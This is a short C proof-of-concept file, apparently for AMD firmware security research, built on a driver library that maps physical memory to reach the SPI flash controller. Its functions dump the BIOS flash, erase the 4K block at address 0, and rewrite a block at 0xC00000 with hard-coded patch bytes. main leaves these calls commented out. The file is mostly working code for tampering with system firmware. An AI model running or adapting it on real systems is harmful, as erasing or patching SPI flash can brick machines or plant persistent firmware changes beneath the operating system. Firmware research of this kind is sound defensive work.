#include "poc.h"

#pragma comment(lib, "platbox_lib.lib")


void poc_flash1() {

	amd_retrieve_chipset_information();

	amd_dump_spi_flash_index_mode("spi_index_rom.bin");
}

void poc_flash2() {
	amd_retrieve_chipset_information();
	amd_spi_erase_4k_block(NULL, 0);
}


void re_patch_bios() {
	amd_retrieve_chipset_information();

	volatile SPI *spi_base = (volatile SPI *) map_physical_memory(g_spi_addr, PAGE_SIZE);

	BYTE *block = (BYTE *) malloc(SPI_INDEX_MODE_WRITE_BLOCK_4K);
	
	UINT32 addr = 0xC00000;
	read_from_flash_index_mode(spi_base, addr, SPI_INDEX_MODE_WRITE_BLOCK_4K, block);
	// Repatch 
	block[0] = 0x05; 
	block[1] = 0x08;
	block[2] = 0x63;
	block[3] = 0x54;
	block[4] = 0x5D;
	block[5] = 0x31;
	block[6] = 0xAF;
	block[7] = 0xD2;

	amd_spi_erase_4k_block(spi_base, addr);

	// Write
    write_4k_block(spi_base, addr, block);

	free(block);
	unmap_physical_memory((void *) spi_base, PAGE_SIZE);
}


int main(int argc, char **argv)
{	

	InitializeDeltaFuzz();
	open_platbox_device();

	init_os_specifics();

	// Add code here
	// poc_flash1();

	close_platbox_device();

    return 0;
}

